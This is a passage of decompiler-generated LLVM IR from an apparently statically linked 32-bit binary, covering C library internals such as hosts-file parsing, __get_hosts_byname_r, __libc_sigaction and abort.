  store i32 ptrtoint ([11 x i8]* @global_var_1001c338.1147 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10013740 = call i32 @__GI_strcoll(i8* %v3_10013740, i32 ptrtoint ([11 x i8]* @global_var_1001c338.1147 to i32))
  store i32 %v4_10013740, i32* %r3.global-to-local, align 4
  %v3_10013744 = icmp eq i32 %v4_10013740, 0
  br i1 %v3_10013744, label %dec_label_pc_10013770, label %dec_label_pc_10013794

dec_label_pc_10013750:                            ; preds = %dec_label_pc_10013788
  %v1_10013750 = add i32 %v2_10013778, 24
  %v2_10013750 = inttoptr i32 %v1_10013750 to i32*
  %v3_10013750 = load i32, i32* %v2_10013750, align 4
  store i32 %v3_10013750, i32* %r3.global-to-local, align 4
  store i32 268515160, i32* @lr, align 4
  %v1_10013754 = call i32 @__GI_strdup(i32 %v3_10013750)
  store i32 %v1_10013754, i32* %r3.global-to-local, align 4
  %v0_1001375c = load i32, i32* @r29, align 4
  %v1_1001375c = add i32 %v0_1001375c, 1
  store i32 %v1_1001375c, i32* %r11.global-to-local, align 4
  %v1_10013760 = mul i32 %v0_1001375c, 4
  store i32 %v1_1001375c, i32* @global_var_1002c94c.1080, align 4
  %v3_1001376c = add i32 %v1_10013760, ptrtoint (i32* @global_var_10032c48.1081 to i32)
  %v4_1001376c = inttoptr i32 %v3_1001376c to i32*
  store i32 %v1_10013754, i32* %v4_1001376c, align 4
  br label %dec_label_pc_10013770

dec_label_pc_10013770:                            ; preds = %dec_label_pc_1001372c, %dec_label_pc_10013750
  %v0_10013770 = load i32, i32* @r31, align 4
  %v1_10013770 = load i32, i32* @r27, align 4
  %v2_10013770 = icmp slt i32 %v0_10013770, %v1_10013770
  %v1_10013774 = mul i32 %v0_10013770, 4
  %v0_10013778 = load i32, i32* @r1, align 4
  %v2_10013778 = add i32 %v0_10013778, %v1_10013774
  br i1 %v2_10013770, label %dec_label_pc_10013788, label %dec_label_pc_10013794

dec_label_pc_10013788:                            ; preds = %dec_label_pc_10013770
  %v3_10013788 = load i32, i32* @global_var_1002c94c.1080, align 4
  %tmp35 = icmp slt i32 %v3_10013788, 3
  br i1 %tmp35, label %dec_label_pc_10013750, label %dec_label_pc_10013794

dec_label_pc_10013794:                            ; preds = %dec_label_pc_10013788, %dec_label_pc_10013770, %dec_label_pc_1001372c
  %v0_10013798 = load i32, i32* @r30, align 4
  store i32 %v0_10013798, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001c344.1148 to i32), i32* @r4, align 4
  %v3_100137a0 = inttoptr i32 %v0_10013798 to i8*
  %v4_100137a0 = call i32 @__GI_strcoll(i8* %v3_100137a0, i32 ptrtoint ([7 x i8]* @global_var_1001c344.1148 to i32))
  store i32 %v4_100137a0, i32* %r3.global-to-local, align 4
  %v3_100137a4 = icmp eq i32 %v4_100137a0, 0
  br i1 %v3_100137a4, label %dec_label_pc_100137e4.preheader, label %dec_label_pc_100137ac

dec_label_pc_100137ac:                            ; preds = %dec_label_pc_10013794
  %v0_100137b0 = load i32, i32* @r30, align 4
  store i32 %v0_100137b0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001c34c.1149 to i32), i32* @r4, align 4
  %v3_100137b8 = inttoptr i32 %v0_100137b0 to i8*
  %v4_100137b8 = call i32 @__GI_strcoll(i8* %v3_100137b8, i32 ptrtoint ([7 x i8]* @global_var_1001c34c.1149 to i32))
  store i32 %v4_100137b8, i32* %r3.global-to-local, align 4
  %v3_100137bc = icmp eq i32 %v4_100137b8, 0
  br i1 %v3_100137bc, label %dec_label_pc_100137e4.preheader, label %dec_label_pc_10013850.backedge

dec_label_pc_100137e4.preheader:                  ; preds = %dec_label_pc_10013794, %dec_label_pc_100137ac
  store i32 ptrtoint (i32* @global_var_10032c38.1136 to i32), i32* @r31, align 4
  %v3_100137f041 = load i32, i32* @global_var_1002c950.1134, align 4
  %v2_100137f443 = icmp sgt i32 %v3_100137f041, 0
  %v1_100137f845 = add i32 %v3_100137f041, -1
  %v1_100137fc46 = mul i32 %v1_100137f845, 4
  store i32 %v1_100137fc46, i32* %r11.global-to-local, align 4
  br i1 %v2_100137f443, label %dec_label_pc_100137c8, label %dec_label_pc_10013804

dec_label_pc_100137c8:                            ; preds = %dec_label_pc_100137e4.preheader, %dec_label_pc_100137c8
  %v1_100137fc48 = phi i32 [ %v1_100137fc, %dec_label_pc_100137c8 ], [ %v1_100137fc46, %dec_label_pc_100137e4.preheader ]
  %v1_100137f847 = phi i32 [ %v1_100137f8, %dec_label_pc_100137c8 ], [ %v1_100137f845, %dec_label_pc_100137e4.preheader ]
  %v2_100137c8 = add i32 %v1_100137fc48, ptrtoint (i32* @global_var_10032c38.1136 to i32)
  %v3_100137c8 = inttoptr i32 %v2_100137c8 to i32*
  %v4_100137c8 = load i32, i32* %v3_100137c8, align 4
  store i32 %v4_100137c8, i32* %r3.global-to-local, align 4
  store i32 %v1_100137f847, i32* @global_var_1002c950.1134, align 4
  store i32 268515284, i32* @lr, align 4
  %v1_100137d0 = call i32 @free(i32 %v4_100137c8)
  store i32 %v1_100137d0, i32* %r3.global-to-local, align 4
  %v3_100137d4 = load i32, i32* @global_var_1002c950.1134, align 4
  %v1_100137dc = mul i32 %v3_100137d4, 4
  %v1_100137e0 = load i32, i32* @r31, align 4
  %v3_100137e0 = add i32 %v1_100137e0, %v1_100137dc
  %v4_100137e0 = inttoptr i32 %v3_100137e0 to i32*
  store i32 0, i32* %v4_100137e0, align 4
  store i32 ptrtoint (i32* @global_var_10032c38.1136 to i32), i32* @r31, align 4
  %v3_100137f0 = load i32, i32* @global_var_1002c950.1134, align 4
  %v2_100137f4 = icmp sgt i32 %v3_100137f0, 0
  %v1_100137f8 = add i32 %v3_100137f0, -1
  %v1_100137fc = mul i32 %v1_100137f8, 4
  store i32 %v1_100137fc, i32* %r11.global-to-local, align 4
  br i1 %v2_100137f4, label %dec_label_pc_100137c8, label %dec_label_pc_10013804

dec_label_pc_10013804:                            ; preds = %dec_label_pc_100137c8, %dec_label_pc_100137e4.preheader
  %v3_1001384459 = phi i32 [ %v3_100137f041, %dec_label_pc_100137e4.preheader ], [ %v3_100137f0, %dec_label_pc_100137c8 ]
  %v1_1001382c49 = load i32, i32* @r27, align 4
  %v2_1001382c50 = icmp sgt i32 %v1_1001382c49, 1
  %v0_1001383453 = load i32, i32* @r1, align 4
  %v2_1001383454 = add i32 %v0_1001383453, 4
  br i1 %v2_1001382c50, label %dec_label_pc_10013844, label %dec_label_pc_10013850.backedge

dec_label_pc_1001380c:                            ; preds = %dec_label_pc_10013844
  %v1_1001380c = add i32 %v2_1001383455, 24
  %v2_1001380c = inttoptr i32 %v1_1001380c to i32*
  %v3_1001380c = load i32, i32* %v2_1001380c, align 4
  store i32 %v3_1001380c, i32* %r3.global-to-local, align 4
  store i32 268515348, i32* @lr, align 4
  %v1_10013810 = call i32 @__GI_strdup(i32 %v3_1001380c)
  store i32 %v1_10013810, i32* %r3.global-to-local, align 4
  %v0_10013818 = load i32, i32* @r29, align 4
  %v1_10013818 = add i32 %v0_10013818, 1
  store i32 %v1_10013818, i32* %r11.global-to-local, align 4
  %v1_1001381c = mul i32 %v0_10013818, 4
  store i32 %v1_10013818, i32* @global_var_1002c950.1134, align 4
  %v3_10013828 = add i32 %v1_1001381c, ptrtoint (i32* @global_var_10032c38.1136 to i32)
  %v4_10013828 = inttoptr i32 %v3_10013828 to i32*
  store i32 %v1_10013810, i32* %v4_10013828, align 4
  %v0_1001382c.pre = load i32, i32* @r31, align 4
  %v1_1001382c = load i32, i32* @r27, align 4
  %v2_1001382c = icmp slt i32 %v0_1001382c.pre, %v1_1001382c
  br i1 %v2_1001382c, label %dec_label_pc_1001380c.dec_label_pc_10013844_crit_edge, label %dec_label_pc_10013850.backedge

dec_label_pc_1001380c.dec_label_pc_10013844_crit_edge: ; preds = %dec_label_pc_1001380c
  %v0_10013834 = load i32, i32* @r1, align 4
  %v1_10013830 = mul i32 %v0_1001382c.pre, 4
  %v2_10013834 = add i32 %v0_10013834, %v1_10013830
  %v3_10013844.pre = load i32, i32* @global_var_1002c950.1134, align 4
  br label %dec_label_pc_10013844

dec_label_pc_10013844:                            ; preds = %dec_label_pc_10013804, %dec_label_pc_1001380c.dec_label_pc_10013844_crit_edge
  %v3_10013844 = phi i32 [ %v3_10013844.pre, %dec_label_pc_1001380c.dec_label_pc_10013844_crit_edge ], [ %v3_1001384459, %dec_label_pc_10013804 ]
  %v2_1001383455 = phi i32 [ %v2_10013834, %dec_label_pc_1001380c.dec_label_pc_10013844_crit_edge ], [ %v2_1001383454, %dec_label_pc_10013804 ]
  %tmp37 = icmp slt i32 %v3_10013844, 4
  br i1 %tmp37, label %dec_label_pc_1001380c, label %dec_label_pc_10013850.backedge

dec_label_pc_10013850:                            ; preds = %dec_label_pc_10013850.backedge, %dec_label_pc_10013850.preheader
  %v0_1001385c = phi i32 [ %v0_1001385c.pre, %dec_label_pc_10013850.backedge ], [ %v0_1001385c16, %dec_label_pc_10013850.preheader ]
  store i32 %v2_10013850, i32* %r3.global-to-local, align 4
  store i32 268515428, i32* @lr, align 4
  %v3_10013860 = call i32 @fgets(i32 %v2_10013850, i32 128, i32 %v0_1001385c)
  store i32 %v3_10013860, i32* %r3.global-to-local, align 4
  %v3_10013864 = icmp eq i32 %v3_10013860, 0
  br i1 %v3_10013864, label %dec_label_pc_10013874, label %dec_label_pc_1001365c.preheader

dec_label_pc_1001365c.preheader:                  ; preds = %dec_label_pc_10013850
  store i32 %v2_10013850, i32* %r3.global-to-local, align 4
  %v2_1001365c3 = load i8, i8* %v1_1001365c2, align 4
  %v3_1001365c4 = zext i8 %v2_1001365c3 to i32
  store i32 %v3_1001365c4, i32* %r11.global-to-local, align 4
  %v3_100136646 = icmp eq i8 %v2_1001365c3, 0
  br i1 %v3_100136646, label %dec_label_pc_10013850.backedge, label %dec_label_pc_10013670.lr.ph

dec_label_pc_10013670.lr.ph:                      ; preds = %dec_label_pc_1001365c.preheader
  %v3_10013670.pre = load i32, i32* @global_var_1002c8a8, align 4
  br label %dec_label_pc_10013670

dec_label_pc_10013874:                            ; preds = %dec_label_pc_10013850
  %v0_10013874 = load i32, i32* @r26, align 4
  store i32 %v0_10013874, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001387c.1150 to i32), i32* @lr, align 4
  %v1_10013878 = inttoptr i32 %v0_10013874 to i16*
  %v2_10013878 = call i32 @__GI_fclose(i16* %v1_10013878)
  store i32 %v2_10013878, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001388c

dec_label_pc_10013880:                            ; preds = %dec_label_pc_1001363c
  %v0_10013880 = call i32 @__GI___h_errno_location()
  store i32 %v0_10013880, i32* %r3.global-to-local, align 4
  %v2_10013888 = inttoptr i32 %v0_10013880 to i32*
  store i32 3, i32* %v2_10013888, align 4
  br label %dec_label_pc_1001388c

dec_label_pc_1001388c:                            ; preds = %entry, %dec_label_pc_10013874, %dec_label_pc_10013880
  store i32 %v2_100135f8, i32* @r3, align 4
  %v0_10013894 = call i32 @__pthread_return_void()
  store i32 %v0_10013894, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013894

; uselistorder directives
  uselistorder i32 %v3_1001365c4, { 2, 0, 1 }
  uselistorder i32 %v1_100137fc46, { 1, 0 }
  uselistorder i32 %v1_100137f845, { 1, 0 }
  uselistorder i32 %v0_100136a4, { 1, 0 }
  uselistorder i32 %v1_100136f4, { 1, 0 }
  uselistorder i8* %v1_100136ec, { 0, 2, 1 }
  uselistorder i8 %v2_100136bc, { 2, 0, 1 }
  uselistorder i32 %v0_100136b8, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1001365c, { 1, 0, 2 }
  uselistorder i32 %v1_10013658, { 0, 2, 1 }
  uselistorder i32 %v2_10013850, { 1, 3, 2, 0 }
  uselistorder i32 %v2_100135f8, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 29, 19, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 27, 18, 28, 0, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r11.global-to-local, { 8, 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___h_errno_location, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_1002c950.1134, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10032c38.1136 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10032c48.1081 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1001388c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013844, { 1, 0 }
  uselistorder label %dec_label_pc_100137c8, { 1, 0 }
  uselistorder label %dec_label_pc_100137e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10013770, { 1, 0 }
  uselistorder label %dec_label_pc_1001372c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013724, { 1, 0 }
  uselistorder label %dec_label_pc_100136ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100136bc, { 1, 0 }
  uselistorder label %dec_label_pc_10013850.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10013850.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_100138b0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268515568, i32* @lr, align 4
  %v9_100138ec = inttoptr i32 %arg3 to i32*
  %v10_100138ec = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_100138ec, i32 %arg4, i32 %arg5, i32 %v4_100138b0, i32 %arg7)
  ret i32 %v10_100138ec
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_10013908 = load i32, i32* @lr, align 4
  store i32 %v0_10013908, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10013914 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10013924 = add i32 %tmp, 4
  store i32 %v1_10013924, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1001392c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1001392c, i32* @r3, align 4
  br i1 %v3_10013914, label %dec_label_pc_10013954, label %dec_label_pc_10013934

dec_label_pc_10013934:                            ; preds = %entry
  %v2_10013934 = load i32, i32* %arg2, align 4
  store i32 %v2_10013934, i32* %r0.global-to-local, align 4
  store i32 268515648, i32* @lr, align 4
  %v0_1001393c = call i32 @memcpy()
  %v0_10013940 = load i32, i32* @r31, align 4
  %v1_10013940 = add i32 %v0_10013940, 132
  %v2_10013940 = inttoptr i32 %v1_10013940 to i32*
  %v3_10013940 = load i32, i32* %v2_10013940, align 4
  store i32 %v3_10013940, i32* %r0.global-to-local, align 4
  %v1_1001394c = add i32 %v0_10013940, 136
  %v2_1001394c = inttoptr i32 %v1_1001394c to i32*
  %v3_1001394c = load i32, i32* %v2_1001394c, align 4
  store i32 %v3_1001394c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10013954

dec_label_pc_10013954:                            ; preds = %entry, %dec_label_pc_10013934
  store i32 268515700, i32* @lr, align 4
  %v0_10013970 = call i32 @__syscall_rt_sigaction()
  %v0_10013974 = load i32, i32* %r30.global-to-local, align 4
  %v3_10013974 = icmp eq i32 %v0_10013974, 0
  store i32 %v0_10013970, i32* @r31, align 4
  br i1 %v3_10013974, label %dec_label_pc_100139b0, label %dec_label_pc_10013984

dec_label_pc_10013984:                            ; preds = %dec_label_pc_10013954
  %v1_1001397c = icmp slt i32 %v0_10013970, 0
  %v1_10013984 = add i32 %v0_10013974, 4
  store i32 %v1_10013984, i32* @r3, align 4
  %v2_10013988 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_10013988, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1001397c, label %dec_label_pc_100139b0, label %dec_label_pc_10013994

dec_label_pc_10013994:                            ; preds = %dec_label_pc_10013984
  %v3_10013994 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_10013994, i32* %r0.global-to-local, align 4
  %v2_10013998 = inttoptr i32 %v0_10013974 to i32*
  store i32 %v3_10013994, i32* %v2_10013998, align 4
  store i32 268515744, i32* @lr, align 4
  %v0_1001399c = call i32 @memcpy()
  %v1_100139a8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100139a8 = add i32 %v1_100139a8, 136
  %v3_100139a8 = inttoptr i32 %v2_100139a8 to i32*
  %v0_100139ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100139ac = load i32, i32* %r30.global-to-local, align 4
  %v2_100139ac = add i32 %v1_100139ac, 132
  %v3_100139ac = inttoptr i32 %v2_100139ac to i32*
  store i32 %v0_100139ac, i32* %v3_100139ac, align 4
  %v0_100139b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100139b0

dec_label_pc_100139b0:                            ; preds = %dec_label_pc_10013984, %dec_label_pc_10013954, %dec_label_pc_10013994
  %v0_100139b4 = phi i32 [ %v0_10013970, %dec_label_pc_10013984 ], [ %v0_10013970, %dec_label_pc_10013954 ], [ %v0_100139b4.pre, %dec_label_pc_10013994 ]
  store i32 %v0_10013908, i32* %r0.global-to-local, align 4
  ret i32 %v0_100139b4

; uselistorder directives
  uselistorder i32 %v0_10013970, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_100139b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013954, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_100139fc.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_100139e0 = call i32 @__pthread_return_0()
  %v2_100139e8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_100139e8, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_10013a0033 = add i32 %v2_100139e8, 124
  %v4_10013a0034 = inttoptr i32 %v3_10013a0033 to i32*
  store i32 0, i32* %v4_10013a0034, align 4
  %v0_10013a0435 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a0436 = add i32 %v0_10013a0435, -1
  store i32 %v1_10013a0436, i32* %r9.global-to-local, align 4
  %v0_10013a0837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013a0838 = add i32 %v0_10013a0837, -1
  store i32 %v1_10013a0838, i32* %ctr.global-to-local, align 4
  %v2_10013a0839 = icmp eq i32 %v1_10013a0838, 0
  br i1 %v2_10013a0839, label %dec_label_pc_10013a0c, label %dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge

dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge: ; preds = %dec_label_pc_100139fc.lr.ph, %dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge
  %v1_10013a0440 = phi i32 [ %v1_10013a04, %dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge ], [ %v1_10013a0436, %dec_label_pc_100139fc.lr.ph ]
  %v0_10013a00.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10013a00.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_100139fc = mul i32 %v1_10013a0440, 4
  %v3_10013a00 = add i32 %v1_100139fc, %v1_10013a00.pre
  %v4_10013a00 = inttoptr i32 %v3_10013a00 to i32*
  store i32 %v0_10013a00.pre, i32* %v4_10013a00, align 4
  %v0_10013a04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a04 = add i32 %v0_10013a04, -1
  store i32 %v1_10013a04, i32* %r9.global-to-local, align 4
  %v0_10013a08 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013a08 = add i32 %v0_10013a08, -1
  store i32 %v1_10013a08, i32* %ctr.global-to-local, align 4
  %v2_10013a08 = icmp eq i32 %v1_10013a08, 0
  br i1 %v2_10013a08, label %dec_label_pc_10013a0c, label %dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge

dec_label_pc_10013a0c:                            ; preds = %dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge, %dec_label_pc_100139fc.lr.ph
  store i32 %v2_100139e8, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10013a14 = call i32 @__sigaddset()
  %v3_10013a18 = icmp eq i32 %v0_10013a14, 0
  br i1 %v3_10013a18, label %dec_label_pc_10013a20, label %dec_label_pc_10013a30

dec_label_pc_10013a20:                            ; preds = %dec_label_pc_10013a0c
  store i32 268515888, i32* @lr, align 4
  %v3_10013a2c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_100139e8, i32 0)
  br label %dec_label_pc_10013a30

dec_label_pc_10013a30:                            ; preds = %dec_label_pc_10013a0c, %dec_label_pc_10013a20
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10013a34 = load i32, i32* @global_var_1002c954.1154, align 4
  %v3_10013a38 = icmp eq i32 %v3_10013a34, 0
  br i1 %v3_10013a38, label %dec_label_pc_10013a40, label %dec_label_pc_10013a68

dec_label_pc_10013a40:                            ; preds = %dec_label_pc_10013a30
  store i32 1, i32* @global_var_1002c954.1154, align 4
  br label %dec_label_pc_10013a48

dec_label_pc_10013a48:                            ; preds = %dec_label_pc_10013ac4, %dec_label_pc_10013a40
  store i32 ptrtoint (i32* @global_var_1002c878.1152 to i32), i32* %r29.global-to-local, align 4
  %v0_10013a54 = call i32 @__pthread_return_0()
  store i32 268515936, i32* @lr, align 4
  %v1_10013a5c = call i32 @__raise(i32 6)
  %v0_10013a64 = call i32 @__pthread_return_0()
  %v3_10013a6c.pre = load i32, i32* @global_var_1002c954.1154, align 4
  br label %dec_label_pc_10013a68

dec_label_pc_10013a68:                            ; preds = %dec_label_pc_10013a30, %dec_label_pc_10013a48
  %v0_10013ae0 = phi i32 [ %v3_10013a34, %dec_label_pc_10013a30 ], [ %v3_10013a6c.pre, %dec_label_pc_10013a48 ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10013a70 = icmp eq i32 %v0_10013ae0, 1
  br i1 %v3_10013a70, label %dec_label_pc_10013ab0.lr.ph, label %dec_label_pc_10013ae0

dec_label_pc_10013ab0.lr.ph:                      ; preds = %dec_label_pc_10013a68
  %v2_10013a7c = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002c954.1154, align 4
  store i32 ptrtoint (i32* @global_var_10013a90.1156 to i32), i32* @lr, align 4
  %v3_10013a8c = call i32 @__GI_memset(i32 %v2_10013a7c, i32 0, i32 140)
  store i32 %v2_100139e8, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_10013a0033, i32* %r9.global-to-local, align 4
  %v2_10013ab825 = add i32 %v2_100139e8, 256
  %v3_10013ab826 = inttoptr i32 %v2_10013ab825 to i32*
  store i32 -1, i32* %v3_10013ab826, align 4
  %v0_10013abc27 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013abc28 = add i32 %v0_10013abc27, -1
  store i32 %v1_10013abc28, i32* %r11.global-to-local, align 4
  %v0_10013ac029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013ac030 = add i32 %v0_10013ac029, -1
  store i32 %v1_10013ac030, i32* %ctr.global-to-local, align 4
  %v2_10013ac031 = icmp eq i32 %v1_10013ac030, 0
  br i1 %v2_10013ac031, label %dec_label_pc_10013ac4, label %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge

dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge: ; preds = %dec_label_pc_10013ab0.lr.ph, %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge
  %v1_10013abc32 = phi i32 [ %v1_10013abc, %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge ], [ %v1_10013abc28, %dec_label_pc_10013ab0.lr.ph ]
  %v1_10013ab4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10013ab8.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10013ab0 = mul i32 %v1_10013abc32, 4
  %v2_10013ab4 = add i32 %v1_10013ab0, %v1_10013ab4.pre
  store i32 %v2_10013ab4, i32* %r9.global-to-local, align 4
  %v2_10013ab8 = add i32 %v2_10013ab4, 132
  %v3_10013ab8 = inttoptr i32 %v2_10013ab8 to i32*
  store i32 %v0_10013ab8.pre, i32* %v3_10013ab8, align 4
  %v0_10013abc = load i32, i32* %r11.global-to-local, align 4
  %v1_10013abc = add i32 %v0_10013abc, -1
  store i32 %v1_10013abc, i32* %r11.global-to-local, align 4
  %v0_10013ac0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013ac0 = add i32 %v0_10013ac0, -1
  store i32 %v1_10013ac0, i32* %ctr.global-to-local, align 4
  %v2_10013ac0 = icmp eq i32 %v1_10013ac0, 0
  br i1 %v2_10013ac0, label %dec_label_pc_10013ac4, label %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge

dec_label_pc_10013ac4:                            ; preds = %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge, %dec_label_pc_10013ab0.lr.ph
  store i32 268516060, i32* @lr, align 4
  %v4_10013ad8 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10013a48

dec_label_pc_10013ae0:                            ; preds = %dec_label_pc_10013a68
  %v3_10013ae0 = icmp eq i32 %v0_10013ae0, 2
  br i1 %v3_10013ae0, label %dec_label_pc_10013ae8, label %dec_label_pc_10013af4

dec_label_pc_10013ae8:                            ; preds = %dec_label_pc_10013ae0
  store i32 3, i32* @global_var_1002c954.1154, align 4
  br label %dec_label_pc_10013af4

dec_label_pc_10013af4:                            ; preds = %dec_label_pc_10013ae0, %dec_label_pc_10013ae8
  %v3_10013af4 = phi i32 [ %v0_10013ae0, %dec_label_pc_10013ae0 ], [ 3, %dec_label_pc_10013ae8 ]
  %v1_10013afc = icmp ne i32 %v3_10013af4, 3
  call void @__pseudo_cond_branch(i1 %v1_10013afc, i32 268516112)
  store i32 4, i32* @global_var_1002c954.1154, align 4
  %v1_10013b0c = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10013b0c

; uselistorder directives
  uselistorder i32 %v1_10013ac0, { 1, 0 }
  uselistorder i32 %v1_10013abc, { 1, 0 }
  uselistorder i32 %v1_10013a08, { 1, 0 }
  uselistorder i32 %v1_10013a04, { 1, 0 }
  uselistorder i32 %v2_100139e8, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 8, 0, 4, 5, 7, 6, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 0, 2, 3, 7, 6, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 0, 1, 11, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 10, 9, 8, 7, 6, 5, 4, 3, 13, 12, 2 }
  uselistorder i32 127, { 2, 8, 0, 3, 5, 9, 1, 6, 7, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 4, 2, 3, 0, 1 }
  uselistorder i32* @global_var_1002c954.1154, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder i32 124, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013af4, { 1, 0 }
  uselistorder label %dec_label_pc_10013ab0.dec_label_pc_10013ab0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10013a68, { 1, 0 }
  uselistorder label %dec_label_pc_10013a30, { 1, 0 }
  uselistorder label %dec_label_pc_100139fc.dec_label_pc_100139fc_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10013b18 = add i32 %arg1, 28
  %v2_10013b18 = inttoptr i32 %v1_10013b18 to i32*
  %v3_10013b18 = load i32, i32* %v2_10013b18, align 4
